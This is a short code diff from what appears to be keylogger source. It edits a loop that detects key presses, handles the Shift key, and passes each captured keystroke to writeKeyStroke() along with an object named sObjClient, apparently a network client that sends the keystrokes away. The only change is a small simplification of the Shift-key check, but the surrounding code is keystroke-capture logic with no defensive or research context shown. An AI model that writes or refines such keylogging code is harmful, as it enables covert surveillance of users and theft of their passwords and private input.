@@ -104,7 +104,7 @@ int main()
             while (key == KEY_IS_PRESSED && dontLogShiftKey)
             {
                 int specialKey = vkMaps.searchAsciiMaps(i);
-                if (isShiftPressed() == 1) 
+                if (isShiftPressed()) 
                 {
                     writeKeyStroke(findShiftPlusKey(), sObjClient);
                 }
